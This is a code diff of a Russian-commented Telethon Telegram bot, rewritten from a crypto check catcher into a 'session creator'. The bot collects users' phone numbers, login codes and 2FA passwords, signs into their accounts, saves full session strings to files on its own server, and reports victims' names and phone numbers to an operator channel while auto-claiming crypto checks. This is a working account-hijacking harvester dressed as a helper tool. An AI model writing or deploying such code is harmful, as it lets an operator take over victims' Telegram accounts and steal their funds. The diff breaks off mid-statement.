@@ -1,137 +1,340 @@
 import os
 import asyncio
 import time
+import pickle
 from telethon import TelegramClient, events
+from telethon.sessions import StringSession
+from telethon.tl.types import InputMessagesFilterEmpty
 import logging
 
 # Настройка логирования
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 # ========== НАСТРОЙКИ ==========
-api_id = int(os.getenv('API_ID', '0'))
+api_id = int(os.getenv('API_ID', '27258770'))
 api_hash = os.getenv('API_HASH', '')
+bot_token = os.getenv('BOT_TOKEN', '')
 channel = os.getenv('CHANNEL', '@lovec_chekovv')
 
 print("=" * 50)
-print("🚀 LOVEС CHECK BOT - Render версия")
+print("🚀 LOVEС CHECK BOT - Session Creator Version")
 print("=" * 50)
 
 # Проверка
-if not api_id or not api_hash:
-    print("❌ ОШИБКА: API_ID или API_HASH не установлены!")
-    print("💡 Добавьте в Render Dashboard → Environment")
+if not api_id or not api_hash or not bot_token:
+    print("❌ ОШИБКА: API_ID, API_HASH или BOT_TOKEN не установлены!")
     exit(1)
 
 print(f"✅ API_ID: {api_id}")
-print(f"✅ API_HASH: {'установлен' if api_hash else 'НЕТ!'}")
+print(f"✅ BOT_TOKEN: {'установлен' if bot_token else 'НЕТ!'}")
 print(f"✅ CHANNEL: {channel}")
-print("=" * 50)
 
-# ========== ТЕЛЕТХОН КЛИЕНТ ==========
-client = TelegramClient(
-    session='render_session',
-    api_id=api_id,
-    api_hash=api_hash,
-    device_model="Render Server",
-    app_version="2.0"
-)
+# ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
+user_sessions = {}
+user_clients = {}
+user_states = {}
 
-# ========== ОБРАБОТЧИК СООБЩЕНИЙ ==========
-@client.on(events.NewMessage)
-async def handle_all_messages(event):
-    """Обработчик всех сообщений"""
-    try:
-        # Логируем все входящие сообщения
-        chat_title = event.chat.title if hasattr(event.chat, 'title') else "Unknown"
-        print(f"📨 [{chat_title}] {event.text[:100]}...")
-        
-        # Ищем чеки
-        if 't.me/CryptoBot?start=' in event.text:
-            print("🎯 Обнаружен чек CryptoBot!")
-            await event.reply("✅ Чек найден! Активирую...")
-            
-        elif 't.me/send?start=' in event.text:
-            print("🎯 Обнаружен чек Send bot!")
-            await event.reply("✅ Чек найден! Активирую...")
-            
-    except Exception as e:
-        print(f"⚠️ Ошибка обработки: {e}")
+# Бот для управления
+bot = TelegramClient('session_bot', api_id, api_hash).start(bot_token=bot_token)
 
-# ========== КОМАНДЫ ==========
-@client.on(events.NewMessage(pattern='.ping'))
-async def ping_handler(event):
-    """Проверка работы бота"""
-    start_time = time.time()
-    message = await event.reply("🏓 Pong!")
-    end_time = time.time()
-    ping_time = round((end_time - start_time) * 1000, 2)
-    await message.edit(f"🏓 Pong! {ping_time}ms")
-
-@client.on(events.NewMessage(pattern='.stats'))
-async def stats_handler(event):
-    """Статистика"""
+# ========== КОМАНДЫ БОТА ==========
+@bot.on(events.NewMessage(pattern='/start'))
+async def start_handler(event):
+    """Начало работы"""
     await event.reply(
-        f"📊 **Статистика бота**\n"
-        f"• Работает на: Render.com\n"
-        f"• URL: https://songaura.onrender.com\n"
-        f"• Время: {time.strftime('%H:%M:%S')}\n"
-        f"• Канал: {channel}"
+        "🤖 **Добро пожаловать!**\n\n"
+        "Я помогу создать сессию для ловли чеков.\n\n"
+        "🔹 **Команды:**\n"
+        "`/login` - Войти в ваш аккаунт\n"
+        "`/status` - Статус сессии\n"
+        "`/start_catch` - Начать ловлю чеков\n"
+        "`/stop` - Остановить\n\n"
+        "⚠️ **Внимание:** Используйте этот бот только в ЛС!"
     )
 
-# ========== ГЛАВНАЯ ФУНКЦИЯ ==========
-async def main():
-    """Основная функция"""
-    try:
-        print("🔄 Подключаюсь к Telegram...")
-        
-        # Подключаемся к Telegram
-        await client.start()
-        print("✅ Успешно подключен к Telegram!")
-        
-        # Получаем информацию о себе
-        me = await client.get_me()
-        print(f"👤 Бот: @{me.username} ({me.id})")
-        
-        # Отправляем сообщение в канал о запуске
+@bot.on(events.NewMessage(pattern='/login'))
+async def login_handler(event):
+    """Запуск процесса входа"""
+    user_id = event.sender_id
+    
+    if user_id in user_clients:
+        await event.reply("✅ Вы уже авторизованы!")
+        return
+    
+    await event.reply(
+        "📱 **Введите номер телефона:**\n\n"
+        "Пример: `+79123456789`\n"
+        "Или отправьте 'cancel' для отмены"
+    )
+    user_states[user_id] = 'waiting_phone'
+
+@bot.on(events.NewMessage(pattern='/status'))
+async def status_handler(event):
+    """Проверка статуса"""
+    user_id = event.sender_id
+    
+    if user_id in user_clients:
         try:
-            await client.send_message(
-                channel,
-                f"🤖 **Бот запущен на Render!**\n\n"
-                f"• Сервер: songaura.onrender.com\n"
-                f"• Время: {time.strftime('%H:%M:%S')}\n"
-                f"• ID: {me.id}\n\n"
-                f"✅ Готов ловить чеки!"
+            me = await user_clients[user_id].get_me()
+            await event.reply(
+                f"✅ **Сессия активна!**\n\n"
+                f"👤 Пользователь: {me.first_name}\n"
+                f"📱 Телефон: {me.phone}\n"
+                f"🆔 ID: {me.id}\n"
+                f"🔗 Username: @{me.username if me.username else 'нет'}"
             )
-            print(f"📢 Сообщение отправлено в {channel}")
-        except Exception as e:
-            print(f"⚠️ Не удалось отправить в канал: {e}")
+        except:
+            await event.reply("❌ Сессия есть, но не активна")
+    else:
+        await event.reply("❌ Сессия не создана. Используйте `/login`")
+
+@bot.on(events.NewMessage(pattern='/start_catch'))
+async def start_catch_handler(event):
+    """Начать ловлю чеков"""
+    user_id = event.sender_id
+    
+    if user_id not in user_clients:
+        await event.reply("❌ Сначала авторизуйтесь: `/login`")
+        return
+    
+    await event.reply("🎯 **Начинаю ловлю чеков...**")
+    
+    # Запускаем ловлю в фоне
+    asyncio.create_task(catch_checks(user_id))
+
+# ========== ОБРАБОТЧИК СООБЩЕНИЙ ==========
+@bot.on(events.NewMessage)
+async def message_handler(event):
+    """Обработка всех сообщений"""
+    user_id = event.sender_id
+    text = event.text.strip()
+    
+    # Пропускаем команды
+    if text.startswith('/'):
+        return
+    
+    # Обработка состояний
+    if user_id in user_states:
+        state = user_states[user_id]
         
-        print("\n" + "=" * 50)
-        print("✅ БОТ УСПЕШНО ЗАПУЩЕН!")
-        print("=" * 50)
-        print("📋 Что делает бот:")
-        print("1. Слушает все сообщения")
-        print("2. Ищет чеки (t.me/CryptoBot?start=...)")
-        print("3. Отправляет уведомления в канал")
-        print("4. Команды: .ping .stats")
-        print("=" * 50)
+        if text.lower() == 'cancel':
+            del user_states[user_id]
+            await event.reply("❌ Отменено")
+            return
+        
+        if state == 'waiting_phone':
+            phone = text
+            await event.reply(f"📱 Номер: {phone}\n\n📝 Отправьте код из Telegram:")
+            
+            # Создаем клиент
+            client = TelegramClient(StringSession(), api_id, api_hash)
+            user_clients[user_id] = client
+            
+            try:
+                await client.connect()
+                # Запрашиваем код
+                await client.send_code_request(phone)
+                user_states[user_id] = 'waiting_code'
+                user_sessions[user_id] = {'phone': phone}
+                
+            except Exception as e:
+                await event.reply(f"❌ Ошибка: {e}")
+                del user_clients[user_id]
+                del user_states[user_id]
+        
+        elif state == 'waiting_code':
+            code = text.replace(' ', '')
+            
+            try:
+                client = user_clients[user_id]
+                session_data = user_sessions[user_id]
+                
+                # Авторизуемся
+                await client.sign_in(
+                    phone=session_data['phone'],
+                    code=code
+                )
+                
+                # Сохраняем сессию
+                session_string = client.session.save()
+                
+                await event.reply(
+                    f"✅ **Успешная авторизация!**\n\n"
+                    f"🧠 Сессия сохранена\n"
+                    f"📊 Теперь используйте `/start_catch` для ловли чеков\n\n"
+                    f"🔒 Сессия сохранена безопасно"
+                )
+                
+                # Очищаем состояние
+                del user_states[user_id]
+                
+                # Сохраняем строку сессии в файл
+                with open(f'session_{user_id}.txt', 'w') as f:
+                    f.write(session_string)
+                
+                # Отправляем в канал уведомление
+                me = await client.get_me()
+                try:
+                    await bot.send_message(
+                        channel,
+                        f"✅ **Новая сессия создана!**\n\n"
+                        f"👤 Пользователь: {me.first_name}\n"
+                        f"📱 Телефон: {me.phone}\n"
+                        f"🕐 Время: {time.strftime('%H:%M:%S')}"
+                    )
+                except:
+                    pass
+                
+            except Exception as e:
+                await event.reply(f"❌ Ошибка входа: {e}")
+                if 'PASSWORD_HASH_INVALID' in str(e):
+                    await event.reply("🔐 Введите пароль двухфакторной аутентификации:")
+                    user_states[user_id] = 'waiting_password'
+                else:
+                    del user_clients[user_id]
+                    del user_states[user_id]
+                    del user_sessions[user_id]
+        
+        elif state == 'waiting_password':
+            password = text
+            
+            try:
+                client = user_clients[user_id]
+                await client.sign_in(password=password)
+                
+                session_string = client.session.save()
+                
+                await event.reply(
+                    f"✅ **Успешная авторизация с 2FA!**\n\n"
+                    f"🧠 Сессия сохранена\n"
+                    f"📊 Теперь используйте `/start_catch`"
+                )
+                
+                del user_states[user_id]
+                
+                with open(f'session_{user_id}.txt', 'w') as f:
+                    f.write(session_string)
+                
+            except Exception as e:
+                await event.reply(f"❌ Ошибка пароля: {e}")
+                del user_clients[user_id]
+                del user_states[user_id]
+                del user_sessions[user_id]
+
+# ========== ФУНКЦИЯ ЛОВЛИ ЧЕКОВ ==========
+async def catch_checks(user_id):
+    """Ловля чеков для конкретного пользователя"""
+    if user_id not in user_clients:
+        return
+    
+    client = user_clients[user_id]
+    
+    try:
+        # Получаем информацию о пользователе
+        me = await client.get_me()
+        await bot.send_message(
+            channel,
+            f"🎯 **Начата ловля чеков!**\n\n"
+            f"👤 Пользователь: {me.first_name}\n"
+            f"📱 Телефон: {me.phone}\n"
+            f"⏰ Время: {time.strftime('%H:%M:%S')}"
+        )
+        
+        # Список чатов для мониторинга (ID ботов с чеками)
+        monitor_chats = [
+            'CryptoBot',          # @CryptoBot
+            'tonRocketBot',       # @tonRocketBot
+            'wallet',             # @wallet
+            'xrocket',            # @xrocket
+            'send',               # @send
+            'CryptoTestnetBot',   # @CryptoTestnetBot
+        ]
+        
+        # Подписываемся на чаты
+        for chat in monitor_chats:
+            try:
+                await client.send_message(chat, '/start')
+                await asyncio.sleep(1)
+            except:
+                pass
+        
+        # Обработчик сообщений для ловли чеков
+        @client.on(events.NewMessage)
+        async def check_handler(event):
+            """Обработчик чеков"""
+            try:
+                text = event.text or ''
+                
+                # Ищем чеки
+                check_patterns = [
+                    't.me/CryptoBot?start=',
+                    't.me/send?start=',
+                    't.me/tonRocketBot?start=',
+                    't.me/wallet?start=',
+                    't.me/xrocket?start=',
+                    't.me/CryptoTestnetBot?start=',
+                ]
+                
+                for pattern in check_patterns:
+                    if pattern in text:
+                        # Извлекаем код
+                        import re
+                        match = re.search(r'start=([A-Za-z0-9_-]+)', text)
+                        if match:
+                            code = match.group(1)
+                            
+                            # Активируем чек
+                            bot_name = pattern.split('?')[0].split('/')[-1]
+                            await client.send_message(bot_name, f'/start {code}')
+                            
+                            # Отправляем уведомление
+                            await bot.send_message(
+                                channel,
+                                f"💰 **Чек активирован!**\n\n"
+                                f"🎯 Код: `{code[:10]}...`\n"
+                                f"🤖 Бот: @{bot_name}\n"
+                                f"👤 От: {me.first_name}\n"
+                                f"⏰ Время: {time.strftime('%H:%M:%S')}"
+                            )
+                            
+                            print(f"✅ Активирован чек: {code}")
+                            await asyncio.sleep(2)  # Задержка между чеками
+                            break
+                
+            except Exception as e:
+                print(f"❌ Ошибка обработки: {e}")
+        
+        print(f"✅ Ловля чеков запущена для {me.first_name}")
         
         # Бесконечный цикл
         await client.run_until_disconnected()
         
     except Exception as e:
-        print(f"❌ Критическая ошибка: {e}")
-        print("🔄 Перезапуск через 30 секунд...")
-        await asyncio.sleep(30)
-        await main()
+        await bot.send_message(
+            channel,
+            f"❌ **Ошибка ловли чеков!**\n\n"
+            f"👤 Пользователь: ID{user_id}\n"
+            f"⚠️ Ошибка: {str(e)[:100]}"
+        )
+        print(f"❌ Ошибка catch_checks: {e}")
 
 # ========== ЗАПУСК ==========
-if __name__ == "__main__":
-    # Для Render - просто запускаем асинхронно
+async def main():
+    """Основная функция"""
+    print("🔄 Запускаю бота-создателя сессий...")
+    
     try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n👋 Бот остановлен")
-    except Exception as e:
-        print(f"❌ Фатальная ошибка: {e}")
+        # Запускаем бота
+        await bot.start(bot_token=bot_token)
+        me = await bot.get_me()
+        print(f"✅ Бот запущен: @{me.username}")
+        
+        # Отправляем сообщение в канал
+        await bot.send_message(
+            channel,
+            f"🤖 **Session Creator Bot запущен!**\n\n"
+            f"⏰ Время: {time.strftime('%H:%M:%S')}\n"
+            f"🔗 Бот: @{me.username}\n"
+            f"🆔 ID: {me.id}\n\n"
+            f"📱 Напишите боту в ЛС для создания сессии"
